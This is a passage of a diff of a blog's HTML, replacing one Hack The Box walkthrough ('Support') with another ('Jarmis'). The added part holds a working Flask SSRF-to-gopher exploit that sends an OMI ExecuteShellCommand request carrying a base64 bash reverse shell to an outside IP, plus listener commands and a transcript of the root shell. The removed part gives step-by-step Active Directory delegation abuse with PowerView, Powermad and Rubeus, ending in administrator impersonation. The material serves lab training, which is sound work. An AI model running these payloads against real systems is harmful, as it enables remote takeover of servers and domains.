+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;a:MessageID&gt;uuid:0AB58087-C2C3-0005-0000-000000010000&lt;/a:MessageID&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:OperationTimeout&gt;PT1M30S&lt;/w:OperationTimeout&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:Locale xml:lang=&#34;en-us&#34; s:mustUnderstand=&#34;false&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;p:DataLocale xml:lang=&#34;en-us&#34; s:mustUnderstand=&#34;false&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:OptionSet s:mustUnderstand=&#34;true&#34; /&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;w:SelectorSet&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">         &lt;w:Selector Name=&#34;__cimnamespace&#34;&gt;root/scx&lt;/w:Selector&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;/w:SelectorSet&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">   &lt;/s:Header&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">   &lt;s:Body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;p:ExecuteShellCommand_INPUT xmlns:p=&#34;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem&#34;&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">         &lt;p:command&gt;</span><span class="si">{}</span><span class="s2">&lt;/p:command&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">         &lt;p:timeout&gt;0&lt;/p:timeout&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">      &lt;/p:ExecuteShellCommand_INPUT&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">   &lt;/s:Body&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&lt;/s:Envelope&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">REQUEST</span> <span class="o">=</span> <span class="s2">&#34;&#34;&#34;POST / HTTP/1.1</span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Host: localhost:5985</span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">User-Agent: curl/7.74.0</span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Length: </span><span class="si">{length}</span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">Content-Type: application/soap+xml;charset=UTF-8</span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="se">\r</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2"></span><span class="si">{body}</span><span class="s2">&#34;&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">)</span>    
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">root</span><span class="p">():</span> 
+</span></span><span class="line"><span class="cl">    <span class="n">cmd</span> <span class="o">=</span> <span class="s2">&#34;echo &#39;YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTgvNjAwMSA8JjEiCg==&#39; | base64 -d | bash&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">DATA</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">req</span> <span class="o">=</span> <span class="n">REQUEST</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span> <span class="n">body</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">enc_req</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">safe</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">redirect</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;gopher://127.0.0.1:5985/_</span><span class="si">{</span><span class="n">enc_req</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">code</span><span class="o">=</span><span class="mi">301</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl">    
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>    
+</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">ssl_context</span><span class="o">=</span><span class="s1">&#39;adhoc&#39;</span><span class="p">,</span> <span class="n">debug</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">8443</span><span class="p">)</span>
+</span></span></code></pre></div><ul>
+<li>I also included the base64 encoded  reverse shell payload in the above python code</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;bash -c &#34;exec bash -i &amp;&gt;/dev/tcp/10.10.14.18/6001 &lt;&amp;1&#34;&#39;</span> <span class="p">|</span> base64
+</span></span></code></pre></div><ul>
+<li>Basically this python code will listen on 8443 and Upon receiving sends the request to target&rsquo;s port 5985 with including malicious payload as data. Then the malicious payload will run the reverse shell.</li>
 </ul>
 
 
-<h2 class="relative group">Privilege Escalation 
-    <div id="privilege-escalation" class="anchor"></div>
+<h3 class="relative group">Performing the attack 
+    <div id="performing-the-attack" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#privilege-escalation" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<ul>
-<li>If we see, user <code>support</code> is in a group called <code>Shared Support Accounts@Support.htb</code> . That group have Generic all permissions over Domain controller Itself.
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222182550.png?raw=true" alt="Pasted image 20241222182550.png" />
-    
-  </figure>
-</li>
-<li>This privilege allows the trustee to manipulate the target object however they wish.</li>
-</ul>
-
-
-<h3 class="relative group">Abusing GenericALL 
-    <div id="abusing-genericall" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#abusing-genericall" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#performing-the-attack" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
 <ul>
-<li>We can abuse this by the help instructions in Bloodhound for this Privilege. Here I am going to create a Fake computer under my control and that will act as DC to get kerberos ticket. Follow the steps below carefully
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media1.tenor.com/m/ZB5i28vlmuMAAAAd/id-be-careful-if-i-were-you-rupaul.gif" alt="care" />
-    
-  </figure>
-</li>
-<li><strong>Required Tools</strong>
-<ul>
-<li><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1" target="_blank">PowersView.ps1</a></li>
-<li><a href="https://raw.githubusercontent.com/Kevin-Robertson/Powermad/refs/heads/master/Powermad.ps1" target="_blank">Powermad.ps1</a></li>
-<li>Rubeus.exe(Pre build from <a href="https://github.com/Flangvik/SharpCollection/tree/master/NetFramework_4.5_x64" target="_blank">SharpCollection</a>)</li>
+<li>Starting the python program</li>
 </ul>
-</li>
-</ul>
-
-
-<h4 class="relative group">Step 1: Upload all the tools to the target system, then 
-    <div id="step-1-upload-all-the-tools-to-the-target-system-then" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-1-upload-all-the-tools-to-the-target-system-then" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<ul>
-<li>Do the following in the winrm shell</li>
-</ul>
-<blockquote>
-<p><code>cd C:\\programdata</code></p></blockquote>
-<blockquote>
-<p><code>upload  PowersView.ps1</code></p></blockquote>
-<blockquote>
-<p><code>upload Powermad.ps1</code></p></blockquote>
-<blockquote>
-<p><code>upload Rubeus.exe</code></p></blockquote>
-<p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185340.png?raw=true" alt="Pasted image 20241222185340.png" />
-    
-  </figure>
-</p>
-
-
-<h4 class="relative group">Step 2: Invoking all the scripts 
-    <div id="step-2-invoking-all-the-scripts" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-2-invoking-all-the-scripts" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">PowerView</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.</span> <span class="p">.\</span><span class="n">Powermad</span><span class="p">.</span><span class="py">ps1</span>
-</span></span></code></pre></div>
-
-<h4 class="relative group">Step 3: Creating a Fake Computer 
-    <div id="step-3-creating-a-fake-computer" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-3-creating-a-fake-computer" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">New-MachineAccount</span> <span class="n">-MachineAccount</span> <span class="p">&lt;</span><span class="n">Computername</span><span class="p">&gt;</span> <span class="n">-Password</span> <span class="vm">$</span><span class="p">(</span><span class="nb">ConvertTo-SecureString</span> <span class="s1">&#39;&lt;Password&gt;&#39;</span> <span class="n">-AsPlainText</span> <span class="n">-Force</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 exp.py
 </span></span></code></pre></div><ul>
-<li>We need SID of the computer that we have created earlier, so that we can assign that value to a variable</li>
+<li>Starting the ncat listener on port <code>443</code></li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$fakesid</span> <span class="p">=</span> <span class="nb">Get-DomainComputer</span> <span class="p">&lt;</span><span class="n">Computername</span><span class="p">&gt;</span> <span class="p">|</span> <span class="nb">select </span><span class="n">-expand</span> <span class="n">objectsid</span>
-</span></span></code></pre></div>
-
-<h4 class="relative group">Step 4: Configuring 
-    <div id="step-4-configuring" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-4-configuring" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<ul>
-<li>Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC</li>
-</ul>
-<span class="flex" style="cursor: pointer;">
-  <span class="rounded-md border border-primary-400 px-1 py-[1px] text-xs font-normal text-primary-700 dark:border-primary-600 dark:text-primary-400">
-     Definition 
-  </span>
-</span>
-
-
-<details>
-  <summary>What is ACL?</summary>
-  <p>An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes.
-Purpose:
-ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection.</p>
-</details>
-
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">Security</span><span class="p">.</span><span class="py">AccessControl</span><span class="p">.</span><span class="py">RawSecurityDescriptor</span> <span class="n">-ArgumentList</span> <span class="s2">&#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;</span><span class="p">$(</span><span class="nv">$fakesid</span><span class="p">)</span><span class="s2">)&#34;</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SDBytes</span> <span class="p">=</span> <span class="nb">New-Object</span> <span class="n">byte</span><span class="p">[]</span> <span class="p">(</span><span class="nv">$SD</span><span class="p">.</span><span class="n">BinaryLength</span><span class="p">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$SD</span><span class="p">.</span><span class="py">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span> <span class="mf">0</span><span class="p">)</span>
-</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-DomainComputer</span> <span class="nv">$TargetComputer</span> <span class="p">|</span> <span class="nb">Set-DomainObject</span> <span class="n">-Set</span> <span class="vm">@</span><span class="p">{</span><span class="s1">&#39;msds-allowedtoactonbehalfofotheridentity&#39;</span><span class="p">=</span><span class="nv">$SDBytes</span><span class="p">}</span>
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185607.png?raw=true" alt="Pasted image 20241222185607.png" />
-    
-  </figure>
-</p>
-
-
-<h4 class="relative group">Step 5: Auth as the Computer 
-    <div id="step-5-auth-as-the-computer" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-5-auth-as-the-computer" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="p">&lt;</span><span class="n">Password</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">ComputerName</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">support</span><span class="p">.</span><span class="py">htb</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ncat --ssl -lnvp <span class="m">443</span>
 </span></span></code></pre></div><ul>
-<li>Now copy the <code>rc4_hmac</code> hash from the output
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185715.png?raw=true" alt="Pasted image 20241222185715.png" />
-    
-  </figure>
-</li>
+<li>Starting the reverse shell listener</li>
 </ul>
-
-
-<h4 class="relative group">Step 6: Get the Kerberos Ticket 
-    <div id="step-6-get-the-kerberos-ticket" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#step-6-get-the-kerberos-ticket" aria-label="Anchor">#</a>
-    </span>        
-    
-</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="py">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="p">&lt;</span><span class="n">Computername</span><span class="p">&gt;$</span> <span class="p">/</span><span class="n">rc4</span><span class="err">:</span><span class="p">&lt;</span><span class="n">Hash</span><span class="p">&gt;</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="err">:</span><span class="n">administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="err">:</span><span class="n">cifs</span><span class="p">/</span><span class="n">dc</span><span class="p">.</span><span class="py">support</span><span class="p">.</span><span class="py">htb</span> <span class="p">/</span><span class="n">ptt</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc -lvnp <span class="m">6001</span>
 </span></span></code></pre></div><ul>
-<li>Now ticket will be captured. We can see the base64 encoded ticket
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222185806.png?raw=true" alt="Pasted image 20241222185806.png" />
-    
-  </figure>
-</li>
-<li>Copy the ticket for Administrator and put in a file called <code>ticket.kirbi.b64</code></li>
-<li>Remove all the whitespaces and unwanted lines, I done this in vim using this command <code>:%s/\s\+//g</code></li>
-<li>Now decode the base64 into a different file</li>
+<li>As we already made the IP rule to redirect the 11th request from port <code>443</code> to port <code>8443</code>. Now lets start the attack by using <code>fetch</code> endpoint pointing to our listener on port <code>443</code>.</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">base64 -d tick.kirbi.b64 &gt; ticket.kirbi
-</span></span></code></pre></div><ul>
-<li>For linux operating systems we have to convert the ticket from <code>kirbi</code> to <code>ccache</code>, for passing the ticket</li>
-<li>We can easily convert this using  <code>ticketConverter.py</code>. It&rsquo;s one of the tool from Impacket tool kit.</li>
+<pre tabindex="0"><code>❯ curl &#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18&#39; | jq .
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100   176  100   176    0     0      2      0  0:01:28  0:01:02  0:00:26    42
+jq: parse error: Invalid numeric literal at line 1, column 7
+</code></pre><ul>
+<li>Response from 443 listener:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo /home/n_emperor/.local/share/pipx/venvs/netexec/bin/ticketConverter.py ticket.kirbi ticket.ccache
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190321.png?raw=true" alt="Pasted image 20241222190321.png" />
-    
-  </figure>
-</p>
-<ul>
-<li>Now <strong>Pass the ticket and spawn a shell</strong></li>
+<pre tabindex="0"><code>❯ ncat --ssl -lnvp 443
+Ncat: Version 7.95 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 9834 084E 3280 ECD3 7580 D227 EA15 2E75 6E9F B3C4
+Ncat: Listening on [::]:443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.11.117:58228.
+Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading
+</code></pre><ul>
+<li>Response from the python listener:</li>
 </ul>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nv">KRB5CCNAME</span><span class="o">=</span>ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass
-</span></span></code></pre></div><p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190446.png?raw=true" alt="Pasted image 20241222190446.png" />
-    
-  </figure>
-</p>
-
-
-<h2 class="relative group">End 
-    <div id="end" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#end" aria-label="Anchor">#</a>
-    </span>        
-    
-</h2>
-<ul>
-<li>Secured the 
-<div class="flex mt-2">
-<span
-  class="rounded-full bg-primary-500 dark:bg-primary-400 text-neutral-50 dark:text-neutral-800 px-1.5 py-[1px] text-xs font-normal"
->
-  <span class="flex flex-row items-center">
-    
-    <span>Root flag</span>
-  </span>
-</span>
-</div>
-
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://github.com/Emp5r0R/Db_of-pics/blob/main/Pasted%20image%2020241222190524.png?raw=true" alt="Pasted image 20241222190524.png" />
-    
-  </figure>
-</li>
+<pre tabindex="0"><code>❯ python3 exp.py                                                                  
+ * Serving Flask app &#39;exp&#39;
+ * Debug mode: on
+WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
+ * Running on all addresses (0.0.0.0)
+ * Running on https://127.0.0.1:8443
+ * Running on https://192.168.65.240:8443
+Press CTRL+C to quit
+10.10.11.117 - - [14/Mar/2025 23:55:13] &#34;GET / HTTP/1.1&#34; 301 -
+</code></pre><ul>
+<li>Got the reverse shell connection and secured both the User flag and Root flag</li>
 </ul>
-<div id="typeit-ed6f7de05ec09d50979e64da77d458d4"></div>
+<pre tabindex="0"><code>❯ nc -lvnp 6001
 
-<script>
-    document.addEventListener("DOMContentLoaded", function () {
-      new TypeIt("#typeit-ed6f7de05ec09d50979e64da77d458d4", {
-        strings: [" Knock..knock... this walkthrough is over, don't forget to check my other walkthroughs. Bye, see you again  "],
-        speed:  100 ,
-        lifeLike:  false ,
-        startDelay:  0 ,
-        breakLines:  true ,
-        waitUntilVisible:  true ,
-        loop:  false 
-      }).go();
-    });
-</script>
-<p>
-  <figure>
-    <img class="my-0 rounded-md" loading="lazy" src="https://media.giphy.com/media/v1.Y2lkPTc5MGI3NjExcjBjdzF0N2Nid25rOTViZWZmcWtmMDZpazQ0b21tbTJxeDY3Z2YwNiZlcD12MV9naWZzX3NlYXJjaCZjdD1n/QLpMNfBtUi3ss/giphy.gif" alt="end" />
-    
-  </figure>
-</p>
-
+listening on [any] 6001 ...
+connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 53816
+bash: cannot set terminal process group (17369): Inappropriate ioctl for device
+bash: no job control in this shell
+root@Jarmis:/var/opt/microsoft/scx/tmp# cd /root/
+cd /root/
+root@Jarmis:/root# cat root.txt
+cat root.txt
+e6d014840d&lt;redacted&gt;
+root@Jarmis:/root# ls /home
+ls /home
+htb
+root@Jarmis:/root# cat /home/htb/user.txt
+cat /home/htb/user.txt
+e2848e17&lt;redacted&gt;
+root@Jarmis:/root# 
+</code></pre>
           
           
           
@@ -1554,7 +1799,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;title=Support%20Walkthrough%28HTB%29"
+      href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;title=Jarmis%20Walkthrough%28HTB%29"
       title="Share on LinkedIn"
       aria-label="Share on LinkedIn"
       >
@@ -1573,7 +1818,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;text=Support%20Walkthrough%28HTB%29"
+      href="https://twitter.com/intent/tweet/?url=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;text=Jarmis%20Walkthrough%28HTB%29"
       title="Tweet on Twitter"
       aria-label="Tweet on Twitter"
       >
@@ -1591,7 +1836,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;resubmit=true&amp;title=Support%20Walkthrough%28HTB%29"
+      href="https://api.whatsapp.com/send?text=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;resubmit=true&amp;title=Jarmis%20Walkthrough%28HTB%29"
       title="Share via WhatsApp"
       aria-label="Share via WhatsApp"
       >
@@ -1610,7 +1855,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;description=Support%20Walkthrough%28HTB%29"
+      href="https://pinterest.com/pin/create/bookmarklet/?url=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;description=Jarmis%20Walkthrough%28HTB%29"
       title="Pin on Pinterest"
       aria-label="Pin on Pinterest"
       >
@@ -1629,7 +1874,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;resubmit=true&amp;title=Support%20Walkthrough%28HTB%29"
+      href="https://reddit.com/submit/?url=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;resubmit=true&amp;title=Jarmis%20Walkthrough%28HTB%29"
       title="Submit to Reddit"
       aria-label="Submit to Reddit"
       >
@@ -1648,7 +1893,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;quote=Support%20Walkthrough%28HTB%29"
+      href="https://www.facebook.com/sharer/sharer.php?u=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;quote=Jarmis%20Walkthrough%28HTB%29"
       title="Share on Facebook"
       aria-label="Share on Facebook"
       >
@@ -1667,7 +1912,7 @@ ACLs ensure that only authorized users can access specific resources and perform
       <a
       target="_blank"
       class="m-1 rounded bg-neutral-300 p-1.5 text-neutral-700 hover:bg-primary-500 hover:text-neutral dark:bg-neutral-700 dark:text-neutral-300 dark:hover:bg-primary-400 dark:hover:text-neutral-800"
-      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1741895312886-support-walkthroughhtb/&amp;subject=Support%20Walkthrough%28HTB%29"
+      href="mailto:?body=http://localhost:1313/Secure-The-Throne/posts/1742061149402-jarmis-walkthroughhtb/&amp;subject=Jarmis%20Walkthrough%28HTB%29"
       title="Send via email"
       aria-label="Send via email"
       >
@@ -1696,8 +1941,8 @@ ACLs ensure that only authorized users can access specific resources and perform
           
         
       <script>
-        var oid = "views_posts\/1741895312886-Support-Walkthrough(HTB)\/index.md"
